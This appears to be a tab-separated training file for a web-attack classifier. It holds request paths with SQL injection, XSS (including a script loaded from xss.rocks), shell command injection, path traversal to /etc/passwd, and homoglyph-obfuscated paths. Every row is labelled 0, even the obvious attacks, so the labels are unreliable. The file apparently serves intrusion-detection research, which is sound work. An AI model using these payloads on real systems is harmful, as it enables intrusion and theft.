sentences 	 labels
/ 𝒔𝑡ring / strings / parameters = 1 "  "  )  as gdcx where 2335 = 2335 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  --  	 0
/ j𝐚∨ascript / pm . exe  	 0
/ 𝐡𝓮lp . php ? q =  ; rm \ x09q81281166 \ x09 #  	 0
/ 𝖘𝗍ring / strings / parameters = < script src =  " http :  &  # 47 ;  &  # 47 ; xss . rocks / xss . jpg "  >  <  / script >  	 0
/ 𝒔𝓉ring / strings / parameters = 1 %  '  and 7366 = 9197 #  	 0
/ ꭈ𝗉xyx07v . asp ?  < script > document . cookie =  " testbnli = 1975 ;  "  <  / script >  	 0
/ 𝚜𝒕ring / strings / parameters = 1 %  '  )  )  ; begin user_lock . sleep ( 5 )  ;  end and  (  (  '  %  '  =  '  	 0
/ 𝒑𝘩pmyadmin / webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  	 0
/ ɩn𝖽ex . php / 1 '  	 0
/ 𝕤𝑡ring / strings / parameters = 1 )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  ( 5099 = 5099  	 0
/ ҽԁv3mapy . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ гꝪle3om5 . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝑠𝒕ring / strings / parameters = -1059 "  "  )  union all select 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 #  	 0
/ ꓒ𝟳ktpmcq . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ⅇ𝔁amples / jsp / colors / search . php ? allwords =  < br >  < script > foo <  / script >  & cid = 0 & title = 1 & desc = 1  	 0
/ 𝐩𝒽pmyadmin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1358744507 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ 𝕤𝓽ring / strings / parameters = % oa ping -n 30 127 . 0 . 0 . 1  	 0
/ o𝗂𝑒504mr . dll ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  / script >  	 0
/ 𝘩𝑒lp . php ? q =  "  & rm \ xa0q59981564 & rem \ xa0  	 0
/ ƽ𝕥ring / strings / parameters = -4108 '  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ' tqjx '  =  ' tqjx  	 0
/ 𝒔𝙩ring / strings / parameters = |   [  9 -ne  $  ( echo wxfpfo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ 𝐬𝓉ring / strings / parameters = 1 '  )  )  )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  (  (  (  ' ctbs '  like  ' ctbs  	 0
/ 𝚙𝘩pmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝗌𝚝ring / strings / parameters = 1 %  '  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  (  '  %  '  =  '  	 0
/ Ƽ𝗊nlm5z2 . jsp ?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >  	 0
/ 𝙨𝒕ring / strings / parameters = select  *  from information_schema . tables --  	 0
/ ƽ𝓉ring / modo = insertar & precio = 1885 +  & b1 = pasar + por + caja  	 0
/ 𝗌𝙩ring / strings / parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 0
/ 𝒻o𝔯um1_professionnel . asp ? n = 1771 & amp ; nn = 100 & amp ; page = c :  \ boot . ini  	 0
/ m𝑎ɩn . php ? logout =  '  \ x0arm \ x09q55586739 \ x09 #  	 0
/ 𝕤𝒕ring / strings / parameters = 1 "  "  )  as kuuf where 6908 = 6908 ; if ( 7899 = 7899 )  select 7899 else drop function zbbp --  	 0
/ 𝗌𝗍ring / strings / parameters = 1 )  )  as krzi where 8727 = 8727 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 0
/ 𝚜𝚝ring / strings / parameters = |  | echo ovbfoe $  (  ( 46 + 36 )  )  $  ( echo ovbfoe ) ovbfoe &  	 0
/ 𝔰𝘵ring / strings / parameters = "  | echo $ ifsytbsts $  (  ( 24 + 38 )  )  $  ( echo $ ifsytbsts ) ytbsts |  	 0
/ ѕ𝚝ring / modoa = registro & login = puglia & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar  	 0
/ 𝘀𝕥ring / strings / parameters = ;  str =  $  ( echo msptmx )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 0
/ 𝗌𝖙ring / modo = entrar & login = rocio4 & pwd = acrecenta ! dora & remember = onany ?   set-cookie :  + tamper = 1041264011025374727 & b1 = entrar  	 0
/ j𝕒𝖛ascript /  . passwd . o  	 0
/ 𝓼𝑡ring / strings / parameters = 1 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  #  huhw  	 0
/ 𝘴𝗍ring / strings / parameters = 1 '  |  |  ( select  ' kbvq '  where 9279 = 9279 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  '  	 0
/ ꜱ𝘵ring / strings / parameters = &  & echo ncexjg $  (  ( 72 + 12 )  )  $  ( echo ncexjg ) ncexjg /  /  	 0
/ 𝖘𝗍ring / strings / parameters = ; echo $ ifsxltpvn $  (  ( 45 + 86 )  )  $  ( echo $ ifsxltpvn ) xltpvn \  	 0
/ 𝓮𝓍amples / jsp / checkbox / index . php ? cat_select =  < script > foo <  / script >  	 0
/ j𝖆𝓋ascript / 2004 . exe  	 0
/ 𝘴𝓉ring / strings / parameters = -6095 '  )  or 6872 = 6872 and  (  ' bfwm '  like  ' bfwm  	 0
/ 𑣁𝔱ring / strings / parameters = & lt ; script src =  /  / xss . rocks /  . j >  	 0
/ 𝗌𝘁ring / strings / parameters = < svg onclick = popup = 1 ;  >  	 0
/ 𝘀𝒕ring / strings / parameters = '   str =  $  ( echo jkjfeg )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 0
/ 𝖘𝘵ring / strings / parameters = '   str =  $  ( echo paacld )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 0
/ 𝘤𝒽ildren ' s /  	 0
/ 𝓼𝒕ring / strings / parameters = |  | echo ihelyg $  (  ( 76 + 62 )  )  $  ( echo ihelyg ) ihelyg &  	 0
/ mooⅾl𝔢 / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 6f + 61 + 64 + 4c + 69 + 62 + 72 + 61 + 72 + 79 + 41 + 00 + 00 + 00 + 00 + 47 + 65 + 74 + 50 + 72 + 6f + 63 + 41 + 64 + 64 +  +  >  > ctdn  	 0
/ j𝘢𝖛ascript / sessions . exe  	 0
/ 𝗌𝘤ripts / mlog . html ? screen =  / etc / passwd  	 0
/ 𝟽ꭎ1pb2xi . nsf ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  	 0
/ 𝘴𝓉ring / strings / parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 0
/ 𝑠𝑡ring / strings / parameters = 1 '  )  order by 1 --  	 0
/ 𐐽𝘨i-bin / contrib / forms / evaluation / c_formevaluation . class . php ? fileroot =  / etc / passwd \ x00  	 0
/ Ꮟl𝟴sefdm . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ m𝖆ꭵn . php ? stuff =  "  & ver \ x09 > q95961944 & rem \ x09  	 0
/ ѕ𝘵ring / strings / parameters = '  waitfor delay  ' 0 : 0 : 20 '   --  	 0
/ ƽ𝔱ring / strings / parameters = '  ) print (  ` echo ehpkwp \ necho  $  (  ( 79 + 86 )  )  \ necho ehpkwp \ necho ehpkwp `  )  ;  /  / ehpkwp  	 0
/ 𝚜𝐭ring / strings / parameters = 1 "  "  where 8672 = 8672 union all select null , null #  	 0
/ 𝖘𝓽ring / strings / parameters = 1 "  "  )  as jiiq where 6847 = 6847 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 0
/ 𝐬𝖼ripts / kernel / loadkernel . php ? installpath =  / etc / passwd \ x00  	 0
/ jα𝘷ascript / surf . exe  	 0
/ 𝑠𝙩ring / strings / parameters = '  or  ' 1 '  =  ' 1 '  --  	 0
/ 𐑈𝘂pport / include / open_form . php ? include_dir = xxpathxx ? cmd = pwd  	 0
/ 𝒔𝐭ring / strings / parameters = 1 '  where 1272 = 1272 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  --  	 0
/ 𐑈𝒕ring / modo = registro & login = fitch & password = libres29 & nombre = aramis & apellidos = bellmunt + callealt & email = frigola @ lesionesmusculares . tv +  & dni = 56967582d & direccion = plza .  + celso + negueruela ,  + 113 ,  +  & ciudad = pajares + de + los + oteros & cp = 18370 & provincia = lava & ntc = 6708069843609931 & b1 = registrar  	 0
/ 𝘧𝐜gi-bin / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝕤𝓽ring / strings / parameters = "  echo bzqfls $  (  ( 30 + 41 )  )  $  ( echo bzqfls ) bzqfls "  	 0
/ 𝒔𝒕ring / strings / parameters = '  ;  str =  $  ( echo zepyms )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 0
/ 𝖊𑣖rx3ya4 . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝕩oo𝒑s232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / rymojltfjq0 +  >  +  / dev / null +  &  '  )  ;  function v  	 0
/ 𝘀𝔱ring / strings / parameters = 1 %  "  "  waitfor delay  ' 0 : 0 : 5 '  --  	 0
/ 𝗌𝕥ring / strings / parameters = 1 %  "  "  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  "  "  %  "  "  =  "  "  	 0
/ 𝔰𝐭ring / strings / parameters = 1 %  '  )  )  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  '  %  '  =  '  	 0
/ ᎥnᏧex . php ? errcode =  < script > alert (  " 413375588092 "  )  ;  <  / script >  	 0
/ 𝐬𝗍ring / strings / parameters = 1 '  +  ( select pagd where 2484 = 2484 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  	 0
/ 𝙨ƽi / envout . bat ?  | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  	 0
/ 𝓈𝚝ring / strings / parameters = ftp :  /  / 192 . 168 . 24 . 203 /  *  < apache_mod_proxy_ftp_glob_xss . nasl >  	 0
/ Ꮒ𝕖lp . php ? q =  '  \ x0adel q56533456  #  	 0
/ ᶃỿ23xnjq . jsp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝐬𝓽ring / strings / parameters = <  !  >  <  !  --  --  >  <  ?  >  <  /  >  	 0
/ 𝑡o𝖕 . php ? stuff =  '  ; uname  > q56884429  #  	 0
/ 𝚜𝓽ring / modo = registro & login = dongmoon & password = setentavo & nombre = naiara & apellidos = ballester + alumbreo & email = demjanenko @ gesautonomos . io & dni = 56050614m & direccion = c /  + colon + 123 ,  + 6 ? c & ciudad = cantalapiedra & cp = 43143 & provincia = lugo & ntca = 6967344603029050 & b1 = registrar  	 0
/ ρl𝑢gins / spamx / editheader . admin . class . php ? _conf [ path ]  = xxpathxx  	 0
/ 𝓻𝔢cordings / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1161314398 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ 𝕤𝗍ring / strings / parameters = |   [  2 -ne  $  ( echo oiyjxa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 0
/ ⅇ𝕩amples / jsp / sessions / include / theme . inc . php ? fullpath =  / etc / passwd \ x00  	 0
/ 𑣁𝚝ring / strings / parameters = 1 "  "  )  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  (  "  " krxy "  "  =  "  " krxy  	 0
/ 𝒾𝈒prbs22 . php ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  	 0
/ 𝕔ɡi-bin / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / windows / win . ini  	 0
/ 𝓼𝑡ring / strings / parameters = echo ymgfhg $  (  ( 56 + 20 )  )  $  ( echo ymgfhg ) ymgfhg &  	 0
/  ⁰ uff0e % uff0e \  % uff0e % uff0e \  { file }  	 0
/ 𝘴𝕥ring / strings / parameters = 1 '  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  	 0
/ ℮𝚡amples / jsp / cal / awstatstotals . php ? sort =  "  ]  . phpinfo (  )  . exit (  )  .  $ a [  "  	 0
/ 𝘁oρ . php ? stuff =  "  & rm q91375949 & rem  	 0
/ 𝖘𝘵ring / strings / parameters = 1 where 6383 = 6383 or elt ( 6272 = 6272 , sleep ( 5 )  )  --  	 0
/ m𝐚𝒾n . php ? logout =  "  \ x0asleep \ x0911 \ x09 #  	 0
/ ɑсcountlogon . cfm ? rtn = 1 "  >  < script > alert (  " 411735577546 "  )  ;  <  / script >  <  " 234  	 0
/ m𝒶ⅈn . php ? logout =  '  & uname  #  	 0
/ 𝙨𝔱ring / modo = insertar & precio = 5289 & b1 = pasar + por + caja '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 0
/ ୨ko𝟲m4c8 . cfc ?  < meta http-equiv = set-cookie content =  " testylik = 3403 "  >  	 0
/ m𝒶ⅈn . php ? logout =  '  \ x0auname \ x09 #  	 0
/ 𝗌𝑐s86g1p . pl ?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >  	 0
/ ℯ𝓍amples / servlets / servlet / way-board / way-board . cgi ? db =  / etc / passwd \ x00  	 0
/ ҽ𝔁amples / jsp / cal / index . php ? search =  < script > foo <  / script >  	 0
/ 𝖊𝗑amples / jsp / jsp2 / jspx / user . cgi ? url =  "  >  < script > alert (  " gossamer_links_url_xss . nasl "  )  ;  <  / script >  & from = add  	 0
